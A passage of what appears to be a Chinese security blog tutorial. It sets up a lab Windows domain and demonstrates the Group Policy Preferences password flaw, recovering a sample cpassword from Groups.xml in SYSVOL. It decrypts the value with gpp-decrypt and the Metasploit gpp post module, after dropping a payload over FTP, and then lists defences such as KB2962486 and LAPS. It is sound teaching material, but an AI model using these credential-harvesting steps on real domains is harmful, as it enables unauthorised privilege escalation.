<h4 id="3-1-2-添加域"><a href="#3-1-2-添加域" class="headerlink" title="3.1.2 添加域"></a>3.1.2 添加域</h4><p>点击左下角开始按钮旁边的服务器管理器，角色 —&gt; 添加角色</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210220084418.png" alt="image-20210116112445745"></p>
<p>选中 Active Directory 域服务</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210220084422.png" alt="image-20210116113323735"></p>
<p>一直下一步，安装即可</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210220084429.png" alt="image-20210116113443897"></p>
<p>关闭后，打开“服务器管理器”，找到Active Directory安装向导</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210220084433.png" alt="image-20210116113523528"></p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210220084437.png" alt="image-20210116113639168"></p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210220084446.png" alt="image-20210116114315069"></p>
<p>因为前面没配置静态IP（前面应该配置为静态IP的，不过这个环境无所谓了），这里选择是：</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210220084451.png" alt="image-20210116114528206"> </p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210220084518.png" alt="image-20210116114630800"></p>
<p>点击是，下一步，设置密码：test.yhy@123</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210220084525.png" alt="image-20210116114714649"></p>
<p>一直下一步，等待安装</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210220084531.png" alt="image-20210116114816453"></p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210220084537.png" alt="image-20210116114855068"></p>
<p>完成，重启。</p>
<p>测试一下：<code>net user /domain</code>, ok</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210220084547.png" alt="image-20210116115925975"></p>
<h4 id="3-1-3安装FTP服务"><a href="#3-1-3安装FTP服务" class="headerlink" title="3.1.3安装FTP服务"></a>3.1.3安装FTP服务</h4><p>虚拟机不知道为啥装不上VMware Tools，没办法拖文件，这里打开FTP服务，使用FTP上传文件。</p>
<p>还是点击左下角开始按钮旁边的服务器管理器，角色 —&gt; 添加角色</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210220084554.png" alt="image-20210116120244713"></p>
<p>选择Web服务（IIS），下一步，最下边选择FTP服务器</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210220084558.png" alt="image-20210116120911584"></p>
<p>一直下一步，安装</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210220084604.png" alt="image-20210116120952490"></p>
<p>完成后，点击开始按钮，所有程序 —&gt; 管理工具 —&gt; Internet 信息服务(IIS)管理器</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210220084609.png" alt="image-20210116120424350"></p>
<p>右键添加FTP站点</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210220084618.png" alt="image-20210116122419671"></p>
<p>站点名称随意，物理路径，这里选择了C盘下新建文件夹，</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210220084624.png" alt="image-20210116123005662"></p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210220084629.png" alt="image-20210116123140690"></p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210220084634.png" alt="image-20210116123215490"></p>
<p>然后完成即可， 这时候使用FTP连接工具即可，连不上通过控制面板，关闭防火墙即可</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210220084638.png" alt="image-20210116123531384"></p>
<h3 id="3-2-创建组策略，批量修改域中机器的本地管理员密码"><a href="#3-2-创建组策略，批量修改域中机器的本地管理员密码" class="headerlink" title="3.2 创建组策略，批量修改域中机器的本地管理员密码"></a>3.2 创建组策略，批量修改域中机器的本地管理员密码</h3><h4 id="3-2-1创建组策略"><a href="#3-2-1创建组策略" class="headerlink" title="3.2.1创建组策略"></a>3.2.1创建组策略</h4><p>Win + R 打开运行 ，输入gpmc.msc ，进入组策略管理。</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210220084644.png" alt="image-20210116124142601"> 		右击<code>组策略</code> —&gt; <code>新建</code>:</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210220084649.png" alt="image-20210116124834370"></p>
<p>右击<code>test</code>(刚刚创建好的组策略对象)–&gt;<code>编辑</code>,来到如下位置：</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210220084653.png" alt="image-20210116124949983"></p>
<p>右击<code>本地用户和组</code>–&gt;<code>新建</code>–&gt;<code>本地用户</code>：</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210220084658.png" alt="image-20210116125418016"></p>
<p>其中设置的密码为<code>hackyhy.123</code></p>
<p>回到组策略管理，设置组策略的对象，添加<code>Domain Computers</code>到组策略组中：</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210220084712.png" alt="image-20210116125705664"></p>
<p>查看组策略对象<code>test</code>的详细信息：</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210220084718.png" alt="image-20210116125821832"></p>
<p>至此，组策略配置完成，域内主机重新登录。</p>
<blockquote>
<p>  管理员在域中新建一个组策略后，操作系统会自动在SYSVO共享目录中生成一个XML文件，即<code>Groups.xml</code>,该文件中保存了该组策略更新后的密码。</p>
</blockquote>
<p>根据test的ID 去访问 <code>\\test.yhy\SYSVOL\test.yhy\Policies</code> 或者本地的<code>C:\Windows\SYSVOL\domain\Policies</code>相对应的策略。</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210220084723.png" alt="image-20210116130016932"></p>
<p>打开，访问<code>\Machine\Preferences\Groups</code>，找到文件<code>Groups.xml</code>，</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210220084729.png" alt="image-20210116130711551"></p>
<p>其中的关注点为<code>cpassword</code>: fjomcrwPmyEFuKDFM1WGGDUe8Ap1iGL&#x2F;RsEuyDABYBI</p>
<h4 id="3-2-2-漏洞利用"><a href="#3-2-2-漏洞利用" class="headerlink" title="3.2.2 漏洞利用"></a>3.2.2 漏洞利用</h4><p>介绍两种简单的利用方式</p>
<ul>
<li>Kali 下，将cpassword 字段复制到kali中，使用gpp-decrypt 进行破解</li>
</ul>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210220084757.png" alt="img"></p>
<ul>
<li><p>msf 模块</p>
<p>使用msf后渗透模块</p>
<p><code>run post/windows/gather/credentials/gpp</code></p>
<p>当拿到目标的session后（这里直接将msf生成的马，通过ftp上传，并执行）</p>
</li>
</ul>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210220084804.png" alt="image-20210116134115737"></p>
<h2 id="4-组策略首选项提权的防御措施"><a href="#4-组策略首选项提权的防御措施" class="headerlink" title="4. 组策略首选项提权的防御措施"></a>4. 组策略首选项提权的防御措施</h2><p>在用于管理组策略的计算机上安装 KB2962486补丁，防止新的凭据被放置在组策略首选项中。微软在2014年修复了组策略首选项提权漏洞，使用的方法就是不再将密码保存在组策略首选项中。</p>
<p>此外，针对Everyone访问权限进行设置，具体如下：</p>
<ol>
<li>设置共享文件夹SYSVOL的访问权限</li>
<li>将包含组策略密码的 XML 文件从 SYSVOL 目录中删除s</li>
<li>不要把密码放在所有域用户都有权访问的文件中 </li>
<li>如果需要更改域中机器的本地管理员密码，建议使用LAPS</li>
</ol>
]]></content>
      <categories>
        <category>域渗透</category>
      </categories>
      <tags>
        <tag>Windows提权</tag>
        <tag>域渗透</tag>
      </tags>
  </entry>
</search>
